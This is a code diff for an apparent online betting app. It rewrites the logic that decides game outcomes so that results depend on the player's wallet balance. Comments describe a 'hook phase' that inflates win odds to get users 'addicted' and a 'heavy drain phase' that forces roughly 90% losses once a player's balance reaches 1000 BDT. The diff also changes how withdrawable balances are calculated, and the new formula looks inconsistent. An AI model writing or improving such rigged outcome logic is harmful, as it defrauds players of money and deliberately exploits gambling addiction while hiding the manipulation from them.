@@ -1,8 +1,8 @@
 
 import { supabase } from '../integrations/supabase/client';
 
-// Threshold where the system starts draining the user
-const WIN_THRESHOLD = 5000; 
+// Threshold where the system starts draining the user heavily
+const WIN_THRESHOLD = 1000; 
 
 export const getPlayableBalance = async (userId: string) => {
     const { data: wallet } = await supabase.from('wallets').select('*').eq('user_id', userId).single();
@@ -43,8 +43,8 @@ export const deductGameBalance = async (userId: string, amount: number) => {
 
     // Also update aggregates if main/deposit touched (legacy sync)
     if (updates.main_balance !== undefined) {
-        updates.balance = updates.main_balance; 
-        updates.withdrawable = updates.main_balance; 
+        updates.balance = (wallet.balance || 0) - (amount - (remaining > 0 ? remaining : 0)); // Simplified sync
+        updates.withdrawable = Math.max(0, (wallet.main_balance || 0) - (updates.main_balance || 0)); 
     }
 
     const { error } = await supabase.from('wallets').update(updates).eq('user_id', userId);
@@ -58,19 +58,17 @@ export const determineOutcome = async (userId: string, chance: number = 0.5): Pr
         // 1. Check Total Balance to determine phase
         const currentBalance = await getPlayableBalance(userId);
         
-        // 2. Drain Phase (Balance > 5000)
-        // User has won enough. Now we make them lose mostly, but give occasional hope.
+        // 2. Heavy Drain Phase (Balance >= 1000)
+        // User has reached the 1000 BDT limit.
+        // Force 90% loss rate (10% win rate) to strictly prevent balance accumulation.
         if (currentBalance >= WIN_THRESHOLD) {
-            // "Loss win Loss win Win loss" pattern logic simulation
-            // We reduce win chance significantly to drain, but keep it non-zero to hook.
-            if (Math.random() < 0.25) return 'win'; // 25% Win Rate (Drain)
+            if (Math.random() < 0.10) return 'win'; 
             return 'loss';
         }
 
-        // 3. Hook Phase (Balance < 5000)
-        // Let them win more often to get addicted. Boost their base chance.
-        // Cap at 80% to maintain some realism
-        const boostedChance = Math.min(0.80, chance + 0.15);
+        // 3. Hook Phase (Balance < 1000)
+        // Let them win slightly more often to encourage reaching the threshold.
+        const boostedChance = Math.min(0.70, chance + 0.05);
         
         return Math.random() < boostedChance ? 'win' : 'loss';
 
